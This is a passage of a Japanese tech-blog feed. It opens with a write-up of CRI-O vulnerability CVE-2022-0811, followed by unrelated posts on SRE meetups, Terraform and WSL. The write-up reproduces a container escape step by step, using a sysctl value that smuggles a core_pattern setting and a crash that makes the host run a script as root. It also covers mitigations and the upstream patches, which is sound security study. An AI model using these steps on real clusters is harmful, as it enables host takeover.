の場合は指定パスのプログラムを実行します (この場合 dump は標準入力として渡される)。/proc/sys/kernel/core_pattern のデフォルト値として、ubuntu (20.04) では apport というバグレポートツールが指定されています。$ cat /proc/sys/kernel/core_pattern|/usr/share/apport/apport %p %s %c %d %P %Eまた Coredump のファイルサイズ上限は ulimit で設定します。脆弱性は Soft Limit が0でも刺さりそうです。# cat /proc/self/limits Limit                     Soft Limit           Hard Limit           Units     Max cpu time              unlimited            unlimited            seconds   Max file size             unlimited            unlimited            bytes     Max data size             unlimited            unlimited            bytes     Max stack size            8388608              unlimited            bytes     Max core file size        0                    unlimited            bytes     Max resident set          unlimited            unlimited            bytes     Max processes             3819                 3819                 processes Max open files            1024                 1048576              files     Max locked memory         67108864             67108864             bytes     Max address space         unlimited            unlimited            bytes     Max file locks            unlimited            unlimited            locks     Max pending signals       3819                 3819                 signals   Max msgqueue size         819200               819200               bytes     Max nice priority         0                    0                    Max realtime priority     0                    0                    Max realtime timeout      unlimited            unlimited            usエクスプロイト要点kernel.core_pattern は Namespaced ではないため、ホストとコンテナで同じファイルを参照するコンテナ内からは変更不可pod 起動時に sysctl に kernel.core_pattern を設定できれば、ホストの値も変更できるCIO-O 内で sysctl のキーを検証しているが、value に + を含む文字列を渡すことでバイパス可能 (以下コードを参照)設定後にプロセスを異常終了させることで、ホストの root 権限で任意コード実行問題となったコードfunc getSysctlForPinns(sysctls map[string]string) string {  // this assumes there\'s no sysctl with a `+` in it  const pinnsSysctlDelim = \\"+\\"  g := new(bytes.Buffer)  for key, value := range sysctls {    fmt.Fprintf(g, \\"\'%s=%s\'%s\\", key, value, pinnsSysctlDelim)  // ← \\"\'key1=value1\'+\'key2=value2\'\\" の形で文字列連結する  }  return strings.TrimSuffix(g.String(), pinnsSysctlDelim)}検証脆弱なバージョンの CRI-O で CVE-2022-0811 を検証します。Kubernetes は使用せず、crictl での検証を行いました。# crio --versioncrio version 1.23.1Version:          1.23.1GitCommit:        af642cdafed31e4be5dd82e996bb084050c8bb89GitTreeState:     dirtyBuildDate:        1980-01-01T00:00:00ZGoVersion:        go1.17.4Compiler:         gcPlatform:         linux/amd64Linkmode:         staticBuildTags:        apparmor, exclude_graphdriver_devicemapper, seccomp, selinuxSeccompEnabled:   trueAppArmorEnabled:  true最初にホストに実行させたいプログラムを配置するコンテナを作成します。json、pod-config.json は前述のファイルと同じものです。# crictl runp pod-config.json d33614f0b22d3d81bb680ee76eb1882a1b6287bb99515d6505d75e315b01297a# crictl create d33614f0b22d3d81bb680ee76eb1882a1b6287bb99515d6505d75e315b01297a container-config.json pod-config.json 9029e03c5ac9abf0475d23981d601df5ed0f9b2ebca4168c4a1f48b2caac6123# crictl start 9029e03c5ac9abf0475d23981d601df5ed0f9b2ebca4168c4a1f48b2caac61239029e03c5ac9abf0475d23981d601df5ed0f9b2ebca4168c4a1f48b2caac6123起動したコンテナにアタッチし、コンテナの root パスにプログラムを配置します。/etc/passwd をコンテナ内の /output に出力するスクリプトを用意しました。# crictl exec -it 9029e03c5ac9abf0475d23981d601df5ed0f9b2ebca4168c4a1f48b2caac6123 bashroot@d33614f0b22d:/# mount | grep overlayoverlay on / type overlay (rw,relatime,lowerdir=/var/lib/containers/storage/overlay/l/73PSGHB33J2RBZXIUVK7SRC4UA,upperdir=/var/lib/containers/storageoverlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/diff,workdir=/var/lib/containers/storage/overlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/work,metacopy=on,volatile)root@d33614f0b22d:/# echo \'#!/bin/sh\' > /cmdroot@d33614f0b22d:/# echo \'cat /etc/passwd > /var/lib/containers/storage/overlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/diff/output\' >> cmdroot@d33614f0b22d:/# cat /cmd#!/bin/shcat /etc/passwd > /var/lib/containers/storage/overlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/diff/outputroot@d33614f0b22d:/# chmod a+x /cmd続いて kernel.core_pattern を変更する pod を作成します。+ で連結した value を記載します。value に記載する kernel.core_pattern には、ホストから見たプログラムの絶対パスを指定しています。# をつけていますが、これは CRI-O の実装で付与されるシングルクォートを無効化する役割があります。# cat /proc/sys/kernel/core_pattern|/usr/share/apport/apport %p %s %c %d %P %E# cat pod-config2.json {    \\"metadata\\": {        \\"name\\": \\"ubuntu-sandbox2\\",        \\"namespace\\": \\"default\\",        \\"attempt\\": 1,        \\"uid\\": \\"edishd83djaidwnduwk28bcsd\\"    },    \\"log_directory\\": \\"/tmp\\",    \\"linux\\": {  \\"sysctls\\": {      \\"kernel.shm_rmid_forced\\": \\"1+kernel.core_pattern=|/var/lib/containers/storage/overlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/diff/cmd #\\"  }    }}# crictl runp pod-config2.json FATA[0001] run pod sandbox: rpc error: code = Unknown desc = container create failed: write to /proc/sys/kernel/shm_rmid_forced: Invalid argument pod 作成はエラーになりますが、kernel.core_pattern を見ると変更されていることがわかります。# cat /proc/sys/kernel/core_pattern |/var/lib/containers/storage/overlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/diff/cmd #\'最後に起動中のコンテナ内でプロセスを異常終了させることで、 Coredump の機能を呼び出しホストの root 権限でプログラムを実行させることができます。root@d33614f0b22d:/# tail -f /dev/null &[1] 17root@d33614f0b22d:/# ps    PID TTY          TIME CMD      4 pts/0    00:00:00 bash     17 pts/0    00:00:00 tail     18 pts/0    00:00:00 psroot@d33614f0b22d:/# kill -SIGSEGV 17root@d33614f0b22d:/# ls /bin  boot  cmd  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  output  proc  root  run  sbin  srv  sys  tmp  usr  var[1]+  Segmentation fault      (core dumped) tail -f /dev/nullroot@d33614f0b22d:/# cat /output root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin...回避策CrowdStrike 社のブログ を参考にしています。CRI-O のアップデート (非推奨だが v1.18 以下へのダウングレードも可)OPA 等のポリシーを設定するPSP で sysctls を全てブロックするpinns の -s を除去するラッパーを用意し、crio.conf の pinns_path に設定する修正パッチcommit1https://github.com/cri-o/cri-o/commit/05c443b06356c2dbf9d30060f362279c6b8ac1a1pinns の -s オプションを生成する箇所で、+ に対してバリデーションを追加しています。  func (mgr *NamespaceManager) NewPodNamespaces(cfg *PodNamespacesConfig) ([]Namespace, error) {    ...      if len(cfg.Sysctls) != 0 {-     pinnsArgs = append(pinnsArgs, \\"-s\\", getSysctlForPinns(cfg.Sysctls))+     pinnsSysctls, err := getSysctlForPinns(cfg.Sysctls)+     if err != nil {+       return nil, errors.Wrapf(err, \\"invalid sysctl\\")+     }+     pinnsArgs = append(pinnsArgs, \\"-s\\", pinnsSysctls)    }      ...  }- func getSysctlForPinns(sysctls map[string]string) string {-   // this assumes there\'s no sysctl with a `+` in it+ func getSysctlForPinns(sysctls map[string]string) (string, error) {+   // This assumes there\'s no valid sysctl value with a `+` in it+   // and as such errors if one is found.    const pinnsSysctlDelim = \\"+\\"    g := new(bytes.Buffer)    for key, value := range sysctls {+     if strings.Contains(key, pinnsSysctlDelim) || strings.Contains(value, pinnsSysctlDelim) {+       return \\"\\", errors.Errorf(\\"\'%s=%s\' is invalid: %s found yet should not be present\\", key, value, pinnsSysctlDelim)+     }      fmt.Fprintf(g, \\"\'%s=%s\'%s\\", key, value, pinnsSysctlDelim)    }-   return strings.TrimSuffix(g.String(), pinnsSysctlDelim)+   return strings.TrimSuffix(g.String(), pinnsSysctlDelim), nil  }commit2https://github.com/cri-o/cri-o/commit/1af1f8af2c7e23525102dffbf0899b69e34ed3d2文字列の連結をやめ、-s をパラメータ毎に設定する修正がされています。  func (mgr *NamespaceManager) NewPodNamespaces(cfg *PodNamespacesConfig) ([]Namespace, error) {    ...  -   if len(cfg.Sysctls) != 0 {-     pinnsSysctls, err := getSysctlForPinns(cfg.Sysctls)-     if err != nil {-       return nil, errors.Wrapf(err, \\"invalid sysctl\\")-     }-     pinnsArgs = append(pinnsArgs, \\"-s\\", pinnsSysctls)+   for key, value := range cfg.Sysctls {+     pinnsArgs = append(pinnsArgs, \\"-s\\", fmt.Sprintf(\\"%s=%s\\", key, value))    }      ...  }containerd の場合他のコンテナランタイムがどうなっているか気になったので、containerd の実装を調べてみました。https://github.com/opencontainers/runc/blob/main/libcontainer/configs/validate/validator.go// sysctl validates that the specified sysctl keys are valid or not.// /proc/sys isn\'t completely namespaced and depending on which namespaces// are specified, a subset of sysctls are permitted.func (v *ConfigValidator) sysctl(config *configs.Config) error {    validSysctlMap := map[string]bool{        \\"kernel.msgmax\\":          true,        \\"kernel.msgmnb\\":          true,        \\"kernel.msgmni\\":          true,        \\"kernel.sem\\":             true,        \\"kernel.shmall\\":          true,        \\"kernel.shmmax\\":          true,        \\"kernel.shmmni\\":          true,        \\"kernel.shm_rmid_forced\\": true,    }    for s := range config.Sysctl {        if validSysctlMap[s] || strings.HasPrefix(s, \\"fs.mqueue.\\") {            if config.Namespaces.Contains(configs.NEWIPC) {                continue            } else {                return fmt.Errorf(\\"sysctl %q is not allowed in the hosts ipc namespace\\", s)            }        }        if strings.HasPrefix(s, \\"net.\\") {            if config.Namespaces.Contains(configs.NEWNET) {                continue            } else {                return fmt.Errorf(\\"sysctl %q is not allowed in the hosts network namespace\\", s)            }        }        return fmt.Errorf(\\"sysctl %q is not in a separate kernel namespace\\", s)    }    return nil}CRI-O は pinns により独自の sysctls 設定を実装していますが、pod 作成時に設定する都合上、 OCI の機能を使わない方法を選んだのかもしれません (根拠はないです)。さいごに初めて CRI-O を触りましたが、Docker や containerd とはかなり仕組みが異なることがわかりました。脆弱性の調査を通して CRI-O の実装や Linux の機能に触れることができ、良い機会を得られたと思います。内容に誤りが含まれる可能性がありますので、何かお気づきの方はご指摘等よろしくお願いします。参考リンクhttps://nvd.nist.gov/vuln/detail/CVE-2022-0811https://blog.aquasec.com/cve-2022-0811-cri-o-vulnerabilityhttps://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/https://github.com/cri-o/cri-o/security/advisories/GHSA-6x2m-w449-qwx7https://pwning.systems/posts/escaping-containers-for-fun/https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mountshttps://valinux.hatenablog.com/entry/20210721https://qiita.com/rarul/items/d33b664c8414f065e65ehttps://man7.org/linux/man-pages/man5/core.5.htmlhttps://lwn.net/Articles/280959/https://wiki.ubuntu.com/Apport","isoDate":"2022-03-28T09:22:43.000Z","dateMiliSeconds":1648459363000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"nnn(Terminal file manager)を使ってみる","link":"https://zenn.dev/tayusa/articles/1f87e798ccbed0","contentSnippet":"nnnとはhttps://github.com/jarun/nnnターミナル上で動作するファイルマネージャー 良い点軽量で高速な動作を保つために機能をプラグインとして外出しして拡張できる設計になってますプラグインはシェルスクリプトなどで簡単に記述できますキーバインドはviライクですtmuxを利用してる状態の画像表示も問題ないですターミナルはkittyを利用しています インストールUbuntu$ sudo apt install nnnArch Linux$ sudo pacman -S nnnMacOS$ bre...","isoDate":"2022-03-27T13:27:45.000Z","dateMiliSeconds":1648387665000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"[2022/03/25] 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220325","contentSnippet":"普段は#kubenewsの2022年03月25日の回で話す、@bells17が今週気になったニュース記事をまとめたものです。自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってます。あと記事はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です。配信URL:https://youtu.be/NewvQB5q-QU 告知とかニュースっぽいもの Cloud Native Database Meetup #4https:...","isoDate":"2022-03-25T12:55:35.000Z","dateMiliSeconds":1648212935000,"authorName":"bells17","authorId":"bells17"},{"title":"[2022/03/18] 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220318","contentSnippet":"普段は#kubenewsの2022年03月18日の回で話す、@bells17が今週気になったニュース記事をまとめたものです。自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってます。あと記事はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です。配信URL:https://youtu.be/y7DMp3aqCFM 告知とかニュースっぽいもの 3-shake SRE Tech Talk #3https://youtu...","isoDate":"2022-03-18T12:50:45.000Z","dateMiliSeconds":1647607845000,"authorName":"bells17","authorId":"bells17"},{"title":"脆弱性に学ぶコンテナセキュリティ","link":"https://speakerdeck.com/kyohmizu/cui-ruo-xing-nixue-bukontenasekiyuritei","contentSnippet":"3-shake SRE Tech Talk #3 の登壇資料です。\\rhttps://3-shake.connpass.com/event/241284/","isoDate":"2022-03-18T04:00:00.000Z","dateMiliSeconds":1647576000000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Observability Conference 2022 に登壇しました","link":"https://zenn.dev/nwiizo/articles/d837b78914de23","contentSnippet":"「Dapr の概念と実装から学ぶ Observability への招待」 というタイトルで登壇します。https://event.cloudnativedays.jp/o11y2022/talks/1382:embed:cite セッション概要Dapr は CloudNative な技術を背景に持つ分散アプリケーションランタイムです。本セッションでは Dapr の Observability に関する各種機能と、その実装について解説していきます。さらにスリーシェイクの Dapr と Observability への取り組みに関してもご紹介します。Dapr の機能でカバーできる点...","isoDate":"2022-03-11T04:02:18.000Z","dateMiliSeconds":1646971338000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"[2022/03/04] 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220304","contentSnippet":"普段は#kubenewsの2022年03月04日の回で話す、@bells17が今週気になったニュース記事をまとめたものです。自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってます。あと記事はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です。配信URL:https://youtu.be/3s0T6k24I_o 告知とかニュースっぽいもの Twitterコミュニティ機能についてhttps://twitter.co...","isoDate":"2022-03-04T12:34:50.000Z","dateMiliSeconds":1646397290000,"authorName":"bells17","authorId":"bells17"},{"title":"Twitterを用いたラジオ番組圧縮手法の提案","link":"https://speakerdeck.com/ota1022/twitterwoyong-itaraziofan-zu-ya-suo-shou-fa-noti-an","contentSnippet":"DEIM2022 C21-2(day2 p13)にて発表したスライドです。\\rhttps://event.dbsj.org/deim2022/\\r学生プレゼンテーション賞\\rhttps://event.dbsj.org/deim2022/post/awards.html","isoDate":"2022-02-28T05:00:00.000Z","dateMiliSeconds":1646024400000,"authorName":"Itaru Ota","authorId":"iota"},{"title":"JAWS-UG SRE支部 #2 突撃！となりのSRE","link":"https://blog.masasuzu.net/entry/2022/02/26/012602","contentSnippet":"jawsug-sre.connpass.com聞いてきましたのでメモと感想を残しておきます。LTマネーフォーワードのマイクロサービス基盤のこれまでとこれから by マネーフォワード @grezarjpマネーフォワードのマイクロサービス基盤の移り変わりの紹介。中央集権構造 => 権限移譲フェーズ => これから中央集権構造サービスごとに開発チームが存在、サービスにまたがってインフラチームが存在開発チームはインフラを気にしなくてもすんだ。メンバーが少ないうちはなんとかなった組織の規模に対してインフラチームがスケールしなくなった責務の分解点を再定義 DevOpsへ権限移譲フェーズ開発チームに権限を渡していくAWSとKubernatesを使用ランタイム、ミドルウェアも開発チームが管理サービスごとにNamespaceを切る、Namespace内で開発チームは権限を持つマイクロサービスごとにAWSアカウント管理して、リソースを管理するこれから権限は渡したが、運用まではむつかしい開発の運用を負荷を下げるためにTerraformのモジュール化、設定のバリデーションの整備AWSアカウントの統制、コスト可視化を進めたいアプリケーションランタイムのSnadbox化特殊要件なアプリケーションで使えるように開発チームにここまでインフラの権限を渡せて、運用できるのはすごいなと思った。QAQ: 開発チームの権限移譲の苦労、運用面、技術面A: マルチアカウントをつかって 技術上の考慮点があった人と人とのかかわりに関しては銀の弾丸はないので、地道な作業が必要ドキュメントとかで監視項目を揃えてあげるのに力を入れたQ: 開発とインフラでスキルセットの違いはあった?A:インフラはアプリをあんまり見てこなかったのでそのへんのギャップはあったQ: EKSのテナント分割の単位A: 権限分類と障害の影響範囲の最小化はシングルテナントが有利とは言われるが運用負荷を下げるためにマルチテナントを選んだSREグループのマネージャーという立場になって真っ先にやったこと by ミクシィ@isaoshimizu内容に関しては、スライドに詳しく書いてあるので参照。SREのミッション・バリューいいなあと思った。うちのチームでもちゃんと考えたい。SRE Lounge #13 LTでも今回と近いことを書いてるので参照してほしいとのこと↓組織にSREの文化を作り上げていくEnabling SRE | Money Forward Engineers\' BlogQAQ: SRE主導でやるべきではなかったことA: SREは万能な人がおおくでできてしまう開発側のリソースが足りなくて急がないといけないことをSREがやってしまう本来はそうじゃないよねって話自分としては、SREでも開発分野でも巻き取れることはやってしまってもいいと思うんですよね。線を引きすぎるとセクショナリズムになってあまり良くない気がしてる。組織のあり方はそれぞれで、コンテキスト分かってないので、言い切ることはできないですが。Containerサービス と Toil と by スリーシェイク \xa0@tt0603ECSとEKSについてToilと紐付けての話題。Toilの削減ステップ特定計測削減ただこのプロセスはつらい。SREとしては長期的なエンジニアリング に時間を使いたい。本質的なことをすることが目的。Toilを削減することが目的ではない。技術選定として、まずマネージドで考える。チームとして何を大事にしているかを考える。自分たちの”サイズ”で技術選定をして価値あるエンジニアリングをする。個人的にはEKSとECSのまとめがわかりやすくてよかった。QAQ: セルフホステッドを選択する場合は?A: 監視するとき Prometheus使うときとかつらいのでFargateは起動が遅い スケールが遅い技術選定において、自分たちの「サイズ」っていう要素が存在するというのは暗黙的なものになりがちなので、ちゃんと具体的に捉えておくの大事な気がした。 #jawsug_sre— Tomoya Kitaura (@kitta0108) 2022年2月25日  先程はパッと答えられませんでしたが、弊社の場合はMicroServiceを運用する際にはIstioを利用するケースが非常に多く、現状では対応していないため、EKSの場合はSelf Hostedを利用するケースが多いですー#jawsug_sre— TakuyaTezuka@3-shake (@tt0603) 2022年2月25日  パネルディスカッションMFのSREの組織のやり方で工夫してるところもともと中央集権的だった、開発に権限移譲していった権限を渡していっていながらそれ以上にプロダクトが開発が増えてしまったので負荷が増えてしまったenabling SREを広げる役割もつくるSREというポジションじゃなくてもSRE的な動きができるように組織にSREの文化を作り上げていくEnabling SRE | Money Forward Engineers\' Blog技術支援からSREの組織変数がいくつか システムの規模 性質 組織規模、レベル感などpure sreではじめて権限移譲していく自分たちのサイズに合わせて組織を作っていく開発とSREのベストの距離感タイミングによって違う固定されたものじゃない構成をいかにシンプルにできるかが大事SREが開発に使いやすいサービスを提供するSREのAPIを提供するので好きに使って的な横断組織SREと開発チーム内SREというパターンもあるお互いのコミュニケーションは大事採用する際に求めるスキルセットやレベル感なんでもかんでも能力を持ってる人はいない。特定の領域に得意を持ってるといい、最低限のレベル感はほしいコミュニケーション 大事 ソフトスキルの担保が大事会社のバリューにあってるかSREワークブックの最後の方求められるスキル書いてあるすべてのインフラコードはIaCに寄せたい、チームにはソフトウェアスキル、インフラスキルそれぞれ持つメンバーがほしい変更時のトラブルシューティングはできるべきコードレビューできるスキルを持っていてほしいコーディングあるていどできる人組織による開発をSREに興味をもってもらうはどうしたらいいのだろうかSLOを決めて共通言語で話す留学すると面白いかもお互いがどういう観点で仕事してるかがわかってよいどこまで開発に移譲するかエラーバジェット、SLO、SLIは必要SREが設定するSLOより開発者が設定するSLOの方がいい開発者にとってうまいところを教えるアプローチ開発者にとってもバグが出ないことによって、気持ちよく開発できるよ!開発者の観点じゃなくてビジネス観点でSLO設定するんじゃないのかなって思う。。。?あと、留学いいなあと思った。開発チームに留学したい。SREチームが存在しない。どんなフェーズになったらSREチームを作ったほうがいいというしきい値あります?開発者が開発以外に手を取られて開発スピードが落ちてるのが目に見えたら兼務の限界値がある。得意なことにバリューを出せるようにしたい開発しながらAWSの新機能をキャッチアップするのはたいへんdevとopsのバランスが崩れているとき SREのプラクティスをいれるといいのかもエラーバジェットが判断軸になるかもどれくらいのチームが困ってるかが判断軸になるToil撲滅の意味で費用対効果高かったLambdaランキング今Lambdaを殆ど使ってないchatbotが出たのでLambdaの役割を終えたEKS上にアプリケーションを作ってしまうことが多い必要悪としてのLambda コードを書くのは最終手段。書いた瞬間に負債になる時刻でEC2終了するLambdaオートスケーリングでいいのでは?terrafromでLambda扱いにくい問題SREとしてセキュリティに対しての役割サービスInspectorECRのイメージスキャンCI/CD成立してからじゃないとイメージスキャンできないGuardDutySSOIAM Userを撲滅できたただ個別要件に対応しにくいSREが見てるケースが多いコーポレートセキュリティは範疇じゃないが、アプリケーションセキュリティは範疇5,6人目にセキュリティが強い人がほしい着想の段階からセキュリティの観点をいれておきたいモニタリングロギングの観点で使用してるAWSのサービスAMPEKS使ってるのでコスパが良かったCloudWatch log通知考えるとLambda使わないとAthenaわずらわしい検索しにくいLokiとかに寄せたいログをどこにおくS3Lokiってこれかな?Grafana Loki | Grafana Labs雑感他の会社のSREの話を今まであまり聞くことがなかったので、気づきを得る部分が多かった。SREのミッション・ビジョン・バリューはちょっと考えてみたいなと思った。オンライン開催の形式はYouTube Liveがいいなあって思った。聞き逃しても巻き戻して聞き返せるのがすごい体験として良い。","isoDate":"2022-02-25T16:26:02.000Z","dateMiliSeconds":1645806362000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"[2022/02/25] 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220225","contentSnippet":"普段は#kubenewsの2022年02月25日の回で話す、@bells17が今週気になったニュース記事をまとめたものです。自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってます。あと記事はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です。配信URL: 配信中止して記事だけ放流したので配信URLはありません 告知とかニュースっぽいもの NetApp Insight Japan 2022で講演しましたセッション動...","isoDate":"2022-02-25T13:31:31.000Z","dateMiliSeconds":1645795891000,"authorName":"bells17","authorId":"bells17"},{"title":"Future Tech Night #20 Terraform State縛りの勉強会 #future_tech_night","link":"https://blog.masasuzu.net/entry/2022/02/17/210848","contentSnippet":"future.connpass.com久しぶりにちゃんと勉強会の感想ブログ書きます。① State の分割戦略 〜ModulesとWorkspacesを利用して〜StateはTerraform上での管理を分ける意味では非常に重要な要素であり、適切に分けることで不慮の事故や予期せぬ変更からクラウドリソースを守ることができます。このセッションでは演者が実際にTerraformを利用して感じたことを交えながら、適切なStateの分割戦略とは？について話します。Stateの分割についてModuleによるアプローチとWorkspacesによるアプローチ、そしてそのあわせ技についての説明がありました。Workspacesは使ったことないのであまり知見がなかったので、いろいろ参考になる部分がありました。今のterraform運用だと環境ごとにディレクトリを切ってstateを分割してます。で、環境ごとの差異としてパラメータだけでなく、作るリソース作らないリソースが若干まちまちなので、そのままだとWorkspacesは向かないなと感じました。絶対に作るリソース、RDSやVPCなどは分割した上でWorkspacesで管理するのはありなのかなとは思いました。ただ、同じシステムで、環境毎のディレクトリとリソース毎のディレクトリが混在するのはわかりにくくならないかなという懸念はあります。悩ましいですねあと、ブランチ戦略も難しいですね。現状はmasterでprdをapplyするように、stagingでそれ以外の環境をapplyするようになってますが、全部masterでやるようにしても良いのではと思ったりもしてる今日このごろです。② クラウドリソース自体をdestroy/createdせずに、Terraformリソース定義の記述場所を変更する方法クラウドサービス上で稼働するリソースには一切手を付けずに、Terraformの定義記載場所だけを変更する方法を話します。Terraformを利用していると「このディレクトリ配置じゃダメだ。配置変えしたいのだけれど、リソースの再作成はできない。次にインフラ設計するときは、〇〇に注意しよう」という運用ナレッジが貯まると思います。スタート時点で完璧なTerraformディレクトリ設計ができれば御の字ですが、それが不可能なことは、この分野でベストプラクティスが確立されていないことにより証明されています。本パートでは「Terraformのディレクトリ配置には定石がないのだから、運用状況に合わせて柔軟に配置換えすべき」という観点から、「動作中リソースに影響なく、Terraform定義箇所を移植する方法」について話します。20220217_FutureTechNight_#20_TerraformState縛りの勉強会.pptx - Google スライドこんなふうに別のtfstateファイルにリソースをmvすることによって、Stateにリソースを移動できる手法を説明してました。terraform state mv -state-out=${moved_resource.tfstate} ${moved_resource}terraform state pull > ${to.tfstate}terraofm state mv -state=${moved_resource.tfstate} -state-out=${to.tfstate}terraform state push ${to.tfstate}State間でのリソース移動に関しては、terraform state rmとterraform importのあわせ技しか知らなかったので、新しい知見を得ました。まだ試せてないないんですが、State内での移動であれば、moved block使うのもありなのかなと思いました。ちなみリソースが消えた場合にもmove blockって使えるんですかね?なかなか他の会社のterraform運用の話を聞く機会があまりなかったので、楽しかったですね。最近勉強会出てもメモすら残さないことが多くて、せっかく参加したのにあまり有意義に時間を使えていなかったので、薄くてもいいので今後ちゃんと感想、意見を書き残していきたいと思いました。","isoDate":"2022-02-17T12:08:48.000Z","dateMiliSeconds":1645099728000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Kubelet APIをcurlで叩く","link":"https://bells17.medium.com/curl-to-kubelet-api-f73cb17888b7?source=rss-713cf42ce34d------2","isoDate":"2022-02-10T16:10:23.000Z","dateMiliSeconds":1644509423000,"authorName":"bells17","authorId":"bells17"},{"title":"WSL2でDNSは8.8.8.8を見つつX Serverを利用する","link":"https://zenn.dev/tayusa/articles/8a76c02772d0a5","contentSnippet":"概要VPNを利用するのでDNSサーバーを8.8.8.8に固定したいしかし、X Serverを使うので環境変数DISPLAYにWindowsが解決するホスト名を使用しているexport DISPLAY=\\"$(hostname).mshome.net:0.0\\"DISPLAYにホスト名ではなくIPアドレスを設定しDNSサーバーを固定する DNSサーバーを固定 /etc/wsl.confを作成/etc/wsl.conf[network]generateResolvConf = false /etc/resolv.confを削除$ sudo unli...","isoDate":"2021-12-28T00:57:59.000Z","dateMiliSeconds":1640653079000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Accurateの内部実装","link":"https://bells17.medium.com/accurate-internal-70915fe716ca?source=rss-713cf42ce34d------2","isoDate":"2021-12-15T18:56:05.000Z","dateMiliSeconds":1639594565000,"authorName":"bells17","authorId":"bells17"},{"title":"GKE CNI Deep Dive (2021)","link":"https://qiita.com/toVersus/items/4ff2525d562d8de4d530","contentSnippet":"GKE (Google Kubernetes Engine) のネットワーク周りの実装はユーザーの見えないところで変化を続けています。以前は、公式ドキュメントにあるように bridge interface (cbr0) を介してホストマシン (ノード) とコンテナ間でパケッ...","isoDate":"2021-10-23T08:20:56.000Z","dateMiliSeconds":1634977256000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"\uD83D\uDD0D 可観測性に入門しよう","link":"https://speakerdeck.com/hiroki_hasegawa/ke-guan-ce-xing-niru-men-siyou","contentSnippet":"社内LTにて、可観測性を布教しようと試みましたʕ◔ϖ◔ʔ\\r\\r関連テーマ（SREに入門しよう）：\\rhttps://speakerdeck.com/hiroki_hasegawa/sreniru-men-siyou","isoDate":"2021-10-22T04:00:00.000Z","dateMiliSeconds":1634875200000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"WSLでGitHubのPersonal access token認証","link":"https://zenn.dev/tayusa/articles/f81e6551642867","contentSnippet":"参考https://github.com/microsoft/Git-Credential-Manager-Core#windows-subsystem-for-linux-wsl GitCredentialManagerとGitをインストールPowerShellにて> winget install --id Microtsoft.GitCredentialManagerCore> winget install --id Git.Gitwingetがなければ https://github.com/microsoft/winget-cli#installing...","isoDate":"2021-09-30T16:01:55.000Z","dateMiliSeconds":1633017715000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"macOS におけるエンドポイントセキュリティの取り組み","link":"https://speakerdeck.com/kyohmizu/macos-niokeruendopointosekiyuriteifalsequ-rizu-mi","contentSnippet":"Infra Study 2nd #5「低レイヤーの世界への誘い」のLT登壇資料です。\\rhttps://forkwell.connpass.com/event/222932/","isoDate":"2021-09-28T04:00:00.000Z","dateMiliSeconds":1632801600000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"ストレングスファインダーのコーチングを受けてみた","link":"https://bells17.medium.com/strengthsfinder-2140afddf46f?source=rss-713cf42ce34d------2","isoDate":"2021-08-11T13:27:04.000Z","dateMiliSeconds":1628688424000,"authorName":"bells17","authorId":"bells17"},{"title":"\uD83C\uDFD7️ ドメイン駆動設計と依存性逆転の原則","link":"https://speakerdeck.com/hiroki_hasegawa/domeinqu-dong-she-ji-toyi-cun-xing-ni-zhuan-falseyuan-ze","contentSnippet":"社内LTにて、ドメイン駆動設計と依存性逆転の原則を布教しましたʕ◔ϖ◔ʔ\\r\\rはてなブックマークのコメントもどうぞ！\\r\\rなお、ドメイン駆動設計を理解するためには、依存についても知る必要があります。\\r\\r是非、依存関係と依存オブジェクト注入もご参照ください\uD83D\uDC4D\uD83C\uDFFB","isoDate":"2021-08-06T04:00:00.000Z","dateMiliSeconds":1628222400000,"authorName":"長谷川 